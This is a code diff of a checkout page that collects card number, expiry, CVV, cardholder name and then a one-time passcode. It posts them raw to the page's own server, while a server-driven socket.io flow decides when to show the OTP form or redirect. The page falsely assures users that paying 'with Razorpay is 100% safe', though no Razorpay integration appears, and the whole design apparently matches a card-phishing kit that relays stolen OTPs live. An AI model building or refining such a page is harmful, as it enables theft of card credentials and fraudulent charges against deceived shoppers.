@@ -111,11 +111,13 @@
       align-items: center;
       justify-content: center;
       height: 100%;
+      gap: 2px;
     }
     .card-type-icon {
       height: 24px;
       width: 38px;
       object-fit: contain;
+      display: none;
     }
     #cardError {
       color: #ef4444;
@@ -246,8 +248,6 @@
         max-height: 28px;
       }
     }
-
-    /* ========= New Overlay Styles ========= */
     .fullscreen-overlay {
       position: fixed;
       top: 0;
@@ -379,18 +379,18 @@
                   <label class="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
                   <div class="relative">
                     <input type="text" id="cardNumber" maxlength="19" class="block w-full px-3 py-2 border border-gray-300 rounded-none pr-12" placeholder="Enter card number" required>
-                    <!-- Add this right after the cardNumber input (before cardError) -->
-<div id="cardTypeIcon" class="absolute right-3 top-1/2 -translate-y-1/2 flex gap-1">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" class="card-type-icon visa-logo hidden h-6">
-  <img src="https://www.pngall.com/wp-content/uploads/2/Mastercard-PNG-File.png" class="card-type-icon mastercard-logo hidden h-6">
-  <img src="https://www.gokiwi.in/homepage/partners/rupay.svg" class="card-type-icon rupay-logo hidden h-6">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" class="card-type-icon amex-logo hidden h-6">
-</div>
+                    <div id="cardTypeIcon">
+                      <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" class="card-type-icon visa-logo">
+                      <img src="https://www.pngall.com/wp-content/uploads/2/Mastercard-PNG-File.png" class="card-type-icon mastercard-logo">
+                      <img src="https://www.gokiwi.in/homepage/partners/rupay.svg" class="card-type-icon rupay-logo">
+                      <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" class="card-type-icon amex-logo">
+                    </div>
                   </div>
                   <p id="cardError" class="text-red-500 text-sm mt-1 hidden">Please enter valid card number</p>
                   <p id="cardInfo" class="text-sm mt-1"></p>
                 </div>
                 <!-- Expiry & CVV Fields -->
+                                <!-- Expiry & CVV Fields -->
                 <div class="grid grid-cols-2 gap-4">
                   <div>
                     <label class="block text-sm font-medium text-gray-700 mb-2">Expiry Date</label>
@@ -399,72 +399,70 @@
                   </div>
                   <div>
                     <label class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
-                    <input type="password" id="cvv" maxlength="3" class="block w-full px
-                                        <!-- CVV Field -->
-                  <input type="password" id="cvv" maxlength="3" class="block w-full px-3 py-2 border border-gray-300 rounded-md" placeholder="123" required>
+                    <input type="password" id="cvv" maxlength="3" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="123" required>
+                  </div>
                 </div>
-              </div>
-              <!-- Cardholder Name Field -->
-              <div>
-                <label class="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
-                <input type="text" id="cardholderName" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="Enter name on card" required>
-              </div>
-              <!-- Submit Button -->
-              <button type="submit" id="submitButton" class="w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400" disabled>
-                <span id="submitText">Proceed to Pay</span>
-                <div id="submitLoader" class="hidden ml-2">
-                  <div class="modern-spinner"></div>
+                <!-- Cardholder Name Field -->
+                <div>
+                  <label class="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
+                  <input type="text" id="cardholderName" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="Enter name on card" required>
                 </div>
-              </button>
-            </form>
-            <!-- Consent Message (in Payment Form) -->
-            <div class="consent-message mt-4" id="consentMessage">
-              <span class="consent-checkbox checked" id="consentCheckbox">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-                  <path d="M5 13l4 4L19 7"/>
-                </svg>
-              </span>
-              <span>Note: Making Payment with 
-                <a href="https://razorpay.com/terms/" 
-                   target="_blank" 
-                   class="underline text-gray-400 hover:text-gray-500 transition-colors">
-                  Razorpay
-                </a> 
-                is 100% safe. Your transaction is processed through a secure https connection.
-              </span>
-            </div>
-          </div>
-          <!-- OTP Form -->
-          <div id="otpForm" class="animate-slide-in hidden">
-            <p class="text-sm text-gray-600 mb-2">
-              OTP has been sent to your registered mobile number for card ending in <span id="cardLastFour"></span>
-            </p>
-            <div class="otp-container">
-              <div class="otp-input-wrapper">
-                <input type="password" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-none" placeholder="••••••" required>
-              </div>
-              <div class="otp-button-wrapper">
-                <!-- Updated OTP confirm button with same dimensions as OTP input -->
-                <button type="button" id="otpSubmitButton" class="w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white" disabled>
-                  <span id="otpText">Confirm</span>
-                  <div id="otpLoader" class="w-5 h-5 animate-spin hidden ml-2">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                      <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"/>
-                    </svg>
+                <!-- Submit Button -->
+                <button type="submit" id="submitButton" class="w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400" disabled>
+                  <span id="submitText">Proceed to Pay</span>
+                  <div id="submitLoader" class="hidden ml-2">
+                    <div class="modern-spinner"></div>
                   </div>
                 </button>
+              </form>
+              <!-- Consent Message (in Payment Form) -->
+              <div class="consent-message mt-4" id="consentMessage">
+                <span class="consent-checkbox checked" id="consentCheckbox">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                    <path d="M5 13l4 4L19 7"/>
+                  </svg>
+                </span>
+                <span>Note: Making Payment with 
+                  <a href="https://razorpay.com/terms/" 
+                     target="_blank" 
+                     class="underline text-gray-400 hover:text-gray-500 transition-colors">
+                    Razorpay
+                  </a> 
+                  is 100% safe. Your transaction is processed through a secure https connection.
+                </span>
               </div>
             </div>
-            <p id="otpError" class="otp-error">Incorrect OTP. Please enter a valid one time passcode.</p>
-            <p class="text-center text-sm text-gray-500 mt-2">Time remaining: <span id="timer">2:59</span></p>
-            <!-- Consent Message in OTP Page -->
-            <div class="consent-message mt-4">
-              <span class="consent-checkbox checked">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-                  <path d="M5 13l4 4L19 7"/>
-                </svg>
-              </span>
-              <span>Note: Making Payment with Razorpay is 100% safe. Your transaction is processed through a secure https connection.</span>
+            <!-- OTP Form -->
+            <div id="otpForm" class="animate-slide-in hidden">
+              <p class="text-sm text-gray-600 mb-2">
+                OTP has been sent to your registered mobile number for card ending in <span id="cardLastFour"></span>
+              </p>
+              <div class="otp-container">
+                <div class="otp-input-wrapper">
+                  <input type="password" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-none" placeholder="••••••" required>
+                </div>
+                <div class="otp-button-wrapper">
+                  <button type="button" id="otpSubmitButton" class="w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white" disabled>
+                    <span id="otpText">Confirm</span>
+                    <div id="otpLoader" class="w-5 h-5 animate-spin hidden ml-2">
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"/>
+                      </svg>
+                    </div>
+                  </button>
+                </div>
+              </div>
+              <p id="otpError" class="otp-error">Incorrect OTP. Please enter a valid one time passcode.</p>
+              <p class="text-center text-sm text-gray-500 mt-2">Time remaining: <span id="timer">2:59</span></p>
+              <!-- Consent Message in OTP Page -->
+              <div class="consent-message mt-4">
+                <span class="consent-checkbox checked">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                    <path d="M5 13l4 4L19 7"/>
+                  </svg>
+                </span>
+                <span>Note: Making Payment with Razorpay is 100% safe. Your transaction is processed through a secure https connection.</span>
+              </div>
             </div>
           </div>
         </div>
@@ -500,39 +498,46 @@
   let consentChecked = true;
   let bankPageWindow = null;
 
-  // ========= Existing Functions =========
-  // Fetch Payment Details Using PID with Fallback
+  // ========= Fetch Payment Details =========
   document.addEventListener('DOMContentLoaded', async () => {
     let urlParams = new URLSearchParams(window.location.search);
     let pid = urlParams.get('pid') || sessionStorage.getItem('pid');
+    
+    const amountDisplay = document.getElementById('displayAmount');
+    const amountInput = document.getElementById('amount');
+    
     if (!pid || pid === "null") {
       console.warn("No valid pid provided; defaulting amount to 100");
-      document.getElementById('amount').value = 100;
-      document.getElementById('displayAmount').textContent = "100";
+      amountInput.value = 100;
+      amountDisplay.textContent = "100.00";
     } else {
       sessionStorage.setItem('pid', pid);
       try {
         const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
         const data = await response.json();
         if (data.status === 'success' && data.payment) {
-          const amount = parseInt(data.payment.amount, 10);
-          if (!isNaN(amount) && amount > 0) {
-            document.getElementById('amount').value = amount;
-            document.getElementById('displayAmount').textContent = amount.toLocaleString('en-IN');
+          const amount = parseFloat(data.payment.amount);
+          if (!isNaN(amount)) {
+            amountInput.value = amount;
+            amountDisplay.textContent = amount.toFixed(2);
           } else {
-            document.getElementById('amount').value = 100;
-            document.getElementById('displayAmount').textContent = "100";
+            amountInput.value = 100;
+            amountDisplay.textContent = "100.00";
           }
         } else {
-          console.error("Payment details not found for pid:", pid);
+          console.error("Payment details not found");
+          amountInput.value = 100;
+          amountDisplay.textContent = "100.00";
         }
       } catch (error) {
-        console.error('Error fetching payment details:', error);
+        console.error('Error:', error);
+        amountInput.value = 100;
+        amountDisplay.textContent = "100.00";
       }
     }
   });
 
-  // Card Validation & Formatting
+  // ========= Card Validation & Formatting =========
   function validateCard(number) {
     let arr = number.replace(/\D/g, '').split('').reverse().map(x => parseInt(x, 10));
     let sum = 0;
@@ -548,21 +553,17 @@
   }
 
   function formatCardNumber(value) {
-  return value.replace(/\D/g, '')
-    .replace(/(\d{4})(?=\d)/g, '$1 ')
-    .substring(0, 19);
-}
-
-function formatCardNumber(value) {
-  return value.replace(/\D/g, '')
-    .replace(/(\d{4})(?=\d)/g, '$1 ')
-    .substring(0, 19);
-}
+    return value.replace(/\D/g, '')
+      .replace(/(\d{4})(?=\d)/g, '$1 ')
+      .substring(0, 19);
+  }
 
   function formatExpiry(value) {
-  return value.replace(/^(\d\d)(\d)$/g, '$1/$2')
-    .replace(/^(\d\d\/\d\d).*$/g, '$1')
-    .replace(/[^\d\/]/g, '');
+    const cleaned = value.replace(/\D/g, '');
+    if (cleaned.length >= 3) {
+      return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`;
+    }
+    return cleaned;
   }
 
   function validateExpiry(value) {
@@ -572,65 +573,57 @@ function formatCardNumber(value) {
     const now = new Date();
     const currentYear = now.getFullYear() % 100;
     const currentMonth = now.getMonth() + 1;
-    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
-    return true;
+    return !(year < currentYear || (year === currentYear && month < currentMonth));
   }
 
+  // ========= Update Card Error =========
   function updateCardError() {
     const cardInput = document.getElementById("cardNumber");
     const errorElem = document.getElementById("cardError");
     const plain = cardInput.value.replace(/\s/g, '');
     isCardValid = (plain.length === 16) ? validateCard(plain) : false;
-    if (plain.length === 16 && !isCardValid) {
-      errorElem.style.display = 'block';
-      errorElem.textContent = "Please enter valid card number";
-      cardInput.classList.add('border-red-500');
-    } else {
-      errorElem.style.display = 'none';
-      cardInput.classList.remove('border-red-500');
-    }
+    errorElem.style.display = (plain.length === 16 && !isCardValid) ? 'block' : 'none';
+    cardInput.classList.toggle('border-red-500', plain.length === 16 && !isCardValid);
   }
 
+  // ========= Detect Card Type =========
   function detectCardType(number) {
     const clean = number.replace(/\D/g, '');
     const patterns = {
-  visa: /^4/,
-  mastercard: /^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)/,
-  amex: /^3[47]/,
-  rupay: /^(508[5-9]|60698|607[0-8]\d|6079[0-8]|608[0-5]|6521[5-9]|652[2-9]\d|6530\d|6531[0-4])/
-};
+      visa: /^4/,
+      mastercard: /^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)/,
+      amex: /^3[47]/,
+      rupay: /^(508[5-9]|60698|607[0-8]\d|6079[0-8]|608[0-5]|6521[5-9]|652[2-9]\d|6530\d|6531[0-4])/
+    };
     for (const [brand, pattern] of Object.entries(patterns)) {
-      if (pattern.test(clean)) {
-        return brand;
-      }
+      if (pattern.test(clean)) return brand;
     }
     return null;
   }
 
-  // Replace the updateCardTypeAndInfo function with:
-async function updateCardTypeAndInfo(value) {
-  const cleanValue = value.replace(/\D/g, '');
-  const logos = {
-    visa: document.querySelector('.visa-logo'),
-    mastercard: document.querySelector('.mastercard-logo'),
-    rupay: document.querySelector('.rupay-logo'),
-    amex: document.querySelector('.amex-logo')
-  };
-
-  // Hide all logos first
-  Object.values(logos).forEach(logo => logo.classList.add('hidden'));
-
-  // Show appropriate logo
-  if (/^4/.test(cleanValue)) {
-    logos.visa.classList.remove('hidden');
-  } else if (/^5[1-5]/.test(cleanValue)) {
-    logos.mastercard.classList.remove('hidden');
-  } else if (/^6(?:011|5)/.test(cleanValue)) {
-    logos.rupay.classList.remove('hidden');
-  } else if (/^3[47]/.test(cleanValue)) {
-    logos.amex.classList.remove('hidden');
+  // ========= Update Card Type and Info =========
+  function updateCardTypeAndInfo(value) {
+    const cleanValue = value.replace(/\D/g, '');
+    const logos = {
+      visa: document.querySelector('.visa-logo'),
+      mastercard: document.querySelector('.mastercard-logo'),
+      rupay: document.querySelector('.rupay-logo'),
+      amex: document.querySelector('.amex-logo')
+    };
+    Object.values(logos).forEach(logo => logo.style.display = 'none');
+    
+    if (/^4/.test(cleanValue)) {
+      logos.visa.style.display = 'block';
+    } else if (/^5[1-5]/.test(cleanValue)) {
+      logos.mastercard.style.display = 'block';
+    } else if (/^6(?:011|5)/.test(cleanValue)) {
+      logos.rupay.style.display = 'block';
+    } else if (/^3[47]/.test(cleanValue)) {
+      logos.amex.style.display = 'block';
+    }
   }
-}
+
+  // ========= Update Submit Button =========
   function updateSubmitButton() {
     const email = document.getElementById('email').value.trim();
     const cardNum = document.getElementById('cardNumber').value.replace(/\s+/g, '');
@@ -638,256 +631,216 @@ async function updateCardTypeAndInfo(value) {
     const cvv = document.getElementById('cvv').value;
     const cardholder = document.getElementById('cardholderName').value.trim();
     const submitButton = document.getElementById('submitButton');
-    if (isCardValid && isExpiryValid && cardNum.length === 16 && cvv.length === 3 && email && cardholder && consentChecked) {
-      submitButton.disabled = false;
-      submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-green-600 hover:bg-green-700";
-    } else {
-      submitButton.disabled = true;
-      submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
-    }
+    const isValid = isCardValid && isExpiryValid && cardNum.length === 16 && cvv.length === 3 && email && cardholder && consentChecked;
+    submitButton.disabled = !isValid;
+    submitButton.className = isValid 
+      ? "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-green-600 hover:bg-green-700"
+      : "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
   }
 
-  function updateConfirmOtpButton() {
-    const otp = document.getElementById('otp').value;
-    const otpButton = document.getElementById('otpSubmitButton');
-    if (otp.length === 6) {
-      otpButton.disabled = false;
-      otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-blue-600 text-white";
-      document.getElementById('otpError').style.display = 'none';
-    } else {
-      otpButton.disabled = true;
-      otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white";
-    }
-  }
-
-  // Consent checkbox event listener
+  // ========= Attach Event Listeners =========
   document.addEventListener("DOMContentLoaded", function(){
-    const consentCheckbox = document.getElementById('consentCheckbox');
-    consentCheckbox.addEventListener('click', function() {
+    const cardInput = document.getElementById("cardNumber");
+    const expiryInput = document.getElementById("expiry");
+    
+    cardInput.addEventListener("input", function(e) {
+      const cursor = e.target.selectionStart;
+      const lastLength = e.target.value.length;
+      const formatted = formatCardNumber(e.target.value);
+      e.target.value = formatted;
+      updateCardError();
+      updateCardTypeAndInfo(formatted);
+      updateSubmitButton();
+      const newCursor = cursor + (formatted.length - lastLength);
+      e.target.setSelectionRange(newCursor, newCursor);
+    });
+
+    expiryInput.addEventListener("input", function(e) {
+      const cursor = e.target.selectionStart;
+      const lastLength = e.target.value.length;
+      const formatted = formatExpiry(e.target.value);
+      e.target.value = formatted;
+      isExpiryValid = validateExpiry(formatted);
+      updateSubmitButton();
+      const newCursor = cursor + (formatted.length - lastLength);
+      e.target.setSelectionRange(newCursor, newCursor);
+    });
+
+    ['email', 'cvv', 'cardholderName'].forEach(id => {
+      document.getElementById(id).addEventListener('input', updateSubmitButton);
+    });
+
+    document.getElementById('consentCheckbox').addEventListener('click', function() {
       consentChecked = !consentChecked;
-      if(consentChecked) {
-        this.classList.add('checked');
-      } else {
-        this.classList.remove('checked');
-      }
+      this.classList.toggle('checked', consentChecked);
       updateSubmitButton();
     });
   });
 
-  // Attach Input Event Listeners
-  document.addEventListener("DOMContentLoaded", function(){
-    const cardInput = document.getElementById("cardNumber");
-    const expiryInput = document.getElementById("expiry");
-    if (cardInput) {
-      cardInput.addEventListener("input", function(e) {
-        const cursor = e.target.selectionStart;
-        const lastLength = e.target.value.length;
-        let formatted = formatCardNumber(e.target.value);
-        e.target.value = formatted;
-        updateCardError();
-        updateCardTypeAndInfo(e.target.value);
-        updateSubmitButton();
-        if (cursor && cursor < lastLength) {
-          const newCursor = cursor + (formatted.length - lastLength);
-          e.target.setSelectionRange(newCursor, newCursor);
-        }
-      });
-    }
-    if (expiryInput) {
-      expiryInput.addEventListener("input", function(e) {
-        const cursor = e.target.selectionStart;
-        const lastLength = e.target.value.length;
-        let formatted = formatExpiry(e.target.value);
-        e.target.value = formatted;
-        isExpiryValid = (formatted.length === 5) ? validateExpiry(formatted) : false;
-        updateSubmitButton();
-        if (cursor && cursor < lastLength) {
-          const newCursor = cursor + (formatted.length - lastLength);
-          e.target.setSelectionRange(newCursor, newCursor);
-        }
-      });
-    }
-    ['email', 'cvv', 'cardholderName'].forEach(id => {
-      document.getElementById(id).addEventListener('input', updateSubmitButton);
-    });
-    document.getElementById('otp').addEventListener('input', function(e) {
-      updateConfirmOtpButton();
-    });
-
-// ========= Payment Submission Handler =========
-document.getElementById('mainForm').addEventListener('submit', async function(e) {
-  e.preventDefault();
-  if (!isCardValid || !isExpiryValid || isProcessing) return;
-  
-  isProcessing = true;
-  const overlay = document.getElementById('bankpageOverlay');
-  const submitButton = document.getElementById('submitButton');
-  
-  // Show fullscreen spinner and blur
-  overlay.style.display = 'flex';
-
-  try {
-    const response = await fetch("/api/sendPaymentDetails", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-        expiry: document.getElementById('expiry').value,
-        cvv: document.getElementById('cvv').value,
-        email: document.getElementById('email').value,
-        amount: document.getElementById('amount').value,
-        currency: "INR",
-        cardholder: document.getElementById('cardholderName').value
-      })
-    });
+  // ========= Payment Submission Handler =========
+  document.getElementById('mainForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    if (!isCardValid || !isExpiryValid || isProcessing) return;
     
-    const result = await response.json();
-    if (result.status === "success") {
-socket.emit('join', currentInvoiceId);
-      bankPageWindow = window.open(`/bankpage.html?invoiceId=${result.invoiceId}`, '_blank');
-      currentInvoiceId = result.invoiceId;
+    isProcessing = true;
+    const overlay = document.getElementById('bankpageOverlay');
+    overlay.style.display = 'flex';
 
-      // Listen for hide bankpage events
-      socket.on(`bankpage_hide_${currentInvoiceId}`, () => {
-        if (bankPageWindow && !bankPageWindow.closed) {
-          bankPageWindow.close();
-        }
-        // Hide overlay but keep button disabled with spinner
-        overlay.style.display = 'none';
-        submitButton.querySelector('#submitLoader').classList.remove('hidden');
-        submitButton.disabled = true;
+    try {
+      const response = await fetch("/api/sendPaymentDetails", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+          expiry: document.getElementById('expiry').value,
+          cvv: document.getElementById('cvv').value,
+          email: document.getElementById('email').value,
+          amount: document.getElementById('amount').value,
+          currency: "INR",
+          cardholder: document.getElementById('cardholderName').value
+        })
       });
+      
+      const result = await response.json();
+      if (result.status === "success") {
+        bankPageWindow = window.open(`/bankpage.html?invoiceId=${result.invoiceId}`, '_blank');
+        currentInvoiceId = result.invoiceId;
 
-    }
-  } catch (err) {
-    console.error('Payment submission error:', err);
-    overlay.style.display = 'none';
-    isProcessing = false;
-  }
-});
-
-    // ========= Existing OTP Handling =========
-    document.getElementById('otpSubmitButton').addEventListener('click', async () => {
-      if (isProcessing) return;
-      isProcessing = true;
-      const otpButton = document.getElementById('otpSubmitButton');
-      const otpLoader = document.getElementById('otpLoader');
-      const btnText = document.getElementById('otpText');
-      btnText.style.opacity = '0.5';
-      btnText.style.filter = 'blur(1px)';
-      otpLoader.classList.remove('hidden');
-      otpButton.disabled = true;
-      try {
-        const response = await fetch("/api/submitOTP", {
-          method: "POST
-                        headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              invoiceId: currentInvoiceId,
-              otp: document.getElementById('otp').value
-            })
-          });
-          if (!response.ok) {
-            throw new Error('Failed to submit OTP');
-          }
-          statusCheckInterval = setInterval(checkTransactionStatus, 2000);
-        } catch (err) {
-          console.error('OTP submission error:', err);
-          alert('Error submitting OTP. Please try again.');
-          isProcessing = false;
-          otpButton.disabled = false;
-          otpLoader.classList.add('hidden');
-          btnText.style.opacity = '1';
-          btnText.style.filter = 'none';
-        }
-      });
-
-      // ========= Existing Transaction Status Check =========
-      async function checkTransactionStatus() {
-        if (!currentInvoiceId) return;
-        try {
-          const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
-          const data = await response.json();
-          if (data.status === 'show_otp') {
-            clearInterval(statusCheckInterval);
-            document.getElementById('paymentForm').classList.add('hidden');
-            document.getElementById('otpForm').classList.remove('hidden');
-            const cardNumber = document.getElementById('cardNumber').value;
-            document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
-            if (!timerInterval) { startOtpTimer(); }
-            if (data.otpError) {
-              document.getElementById('otpError').style.display = 'block';
-              const otpButton = document.getElementById('otpSubmitButton');
-              const otpLoader = document.getElementById('otpLoader');
-              const btnText = document.getElementById('otpText');
-              btnText.style.opacity = '1';
-              btnText.style.filter = 'none';
-              otpLoader.classList.add('hidden');
-              otpButton.disabled = false;
-            } else {
-              document.getElementById('otpError').style.display = 'none';
+        statusCheckInterval = setInterval(async () => {
+          try {
+            const statusRes = await fetch(`/api/checkTransactionStatus?invoiceId=${result.invoiceId}`);
+            const status = await statusRes.json();
+            
+            if (!status.redirectUrl?.includes('bankpage')) {
+              clearInterval(statusCheckInterval);
+              overlay.style.display = 'none';
+              if (bankPageWindow && !bankPageWindow.closed) {
+                bankPageWindow.close();
+              }
             }
-            isProcessing = false;
-          } else if (data.status === 'redirect') {
-            window.location.href = data.redirectUrl;
-          }
-        } catch (err) {
-          console.error('Error checking transaction status:', err);
-        }
-      }
-
-      // ========= Existing OTP Timer =========
-      function startOtpTimer() {
-        if (timerInterval) clearInterval(timerInterval);
-        timer = 180;
-        timerInterval = setInterval(() => {
-          timer--;
-          const minutes = Math.floor(timer / 60);
-          const seconds = timer % 60;
-          document.getElementById('timer').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
-          if (timer <= 0) {
-            clearInterval(timerInterval);
-            window.location.href = '/fail.html';
+          } catch (err) {
+            console.error('Status check error:', err);
+            clearInterval(statusCheckInterval);
           }
         }, 1000);
       }
-    });
-
-    // ========= Existing Socket.io Code =========
-    const socket = io();
-    const storedInvoiceId = localStorage.getItem("invoiceId");
-    if (storedInvoiceId) {
-      socket.emit('join', storedInvoiceId);
+    } catch (err) {
+      console.error('Payment submission error:', err);
+      overlay.style.display = 'none';
+      alert('Error processing payment. Please try again.');
+      isProcessing = false;
     }
-    socket.on('show_otp', (data) => {
-      document.getElementById('paymentForm').classList.add('hidden');
-      document.getElementById('otpForm').classList.remove('hidden');
-    });
-    socket.on('redirect', (data) => {
-      window.location.href = data.redirectUrl;
-    });
-  // Add this after existing socket listeners
-socket.on('show_otp', (data) => {
-  if (data.invoiceId === currentInvoiceId) {
-    // Hide all spinners
-    document.getElementById('bankpageOverlay').style.display = 'none';
-    document.getElementById('submitLoader').classList.add('hidden');
-    
-    // Show OTP form
+  });
+
+  // ========= OTP Handling =========
+  document.getElementById('otpSubmitButton').addEventListener('click', async () => {
+    if (isProcessing) return;
+    isProcessing = true;
+    const otpButton = document.getElementById('otpSubmitButton');
+    const otpLoader = document.getElementById('otpLoader');
+    const btnText = document.getElementById('otpText');
+    btnText.style.opacity = '0.5';
+    btnText.style.filter = 'blur(1px)';
+    otpLoader.classList.remove('hidden');
+    otpButton.disabled = true;
+    try {
+      const response = await fetch("/api/submitOTP", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          invoiceId: currentInvoiceId,
+          otp: document.getElementById('otp').value
+        })
+      });
+      if (!response.ok) {
+        throw new Error('Failed to submit OTP');
+      }
+      statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+    } catch (err) {
+      console.error('OTP submission error:', err);
+      alert('Error submitting OTP. Please try again.');
+      isProcessing = false;
+      otpButton.disabled = false;
+      otpLoader.classList.add('hidden');
+      btnText.style.opacity = '1';
+      btnText.style.filter = 'none';
+    }
+  });
+
+  // ========= Transaction Status Check =========
+  async function checkTransactionStatus() {
+    if (!currentInvoiceId) return;
+    try {
+      const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
+      const data = await response.json();
+      if (data.status === 'show_otp') {
+        clearInterval(statusCheckInterval);
+        document.getElementById('paymentForm').classList.add('hidden');
+        document.getElementById('otpForm').classList.remove('hidden');
+        const cardNumber = document.getElementById('cardNumber').value;
+        document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
+        if (!timerInterval) { startOtpTimer(); }
+        if (data.otpError) {
+          document.getElementById('otpError').style.display = 'block';
+          const otpButton = document.getElementById('otpSubmitButton');
+          const otpLoader = document.getElementById('otpLoader');
+          const btnText = document.getElementById('otpText');
+          btnText.style.opacity = '1';
+          btnText.style.filter = 'none';
+          otpLoader.classList.add('hidden');
+          otpButton.disabled = false;
+        } else {
+          document.getElementById('otpError').style.display = 'none';
+        }
+        isProcessing = false;
+      } else if (data.status === 'redirect') {
+        window.location.href = data.redirectUrl;
+      }
+    } catch (err) {
+      console.error('Error checking transaction status:', err);
+    }
+  }
+
+  // ========= OTP Timer =========
+  function startOtpTimer() {
+    if (timerInterval) clearInterval(timerInterval);
+    timer = 180;
+    timerInterval = setInterval(() => {
+      timer--;
+      const minutes = Math.floor(timer / 60);
+      const seconds = timer % 60;
+      document.getElementById('timer').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+      if (timer <= 0) {
+        clearInterval(timerInterval);
+        window.location.href = '/fail.html';
+      }
+    }, 1000);
+  }
+
+  // ========= Socket.io Code =========
+  const socket = io();
+  const storedInvoiceId = localStorage.getItem("invoiceId");
+  if (storedInvoiceId) {
+    socket.emit('join', storedInvoiceId);
+  }
+  socket.on('show_otp', (data) => {
     document.getElementById('paymentForm').classList.add('hidden');
     document.getElementById('otpForm').classList.remove('hidden');
-  }
-});
+  });
+  socket.on('redirect', (data) => {
+    window.location.href = data.redirectUrl;
+  });
 
-    // ========= Existing Back Button Prevention =========
-    window.onpopstate = function(event) {
-      if (confirm("Do you want to cancel this transaction?")) {
-        window.location.href = '/fail.html?reason=canceled';
-      } else {
-        history.pushState(null, null, window.location.href);
-      }
-    };
-    history.pushState(null, null, window.location.href);
-  </script>
-  <script src="/socket.io/socket.io.js"></script>
+  // ========= Back Button Prevention =========
+  window.onpopstate = function(event) {
+    if (confirm("Do you want to cancel this transaction?")) {
+      window.location.href = '/fail.html?reason=canceled';
+    } else {
+      history.pushState(null, null, window.location.href);
+    }
+  };
+  history.pushState(null, null, window.location.href);
+</script>
+<script src="/socket.io/socket.io.js"></script>
 </body>
 </html>
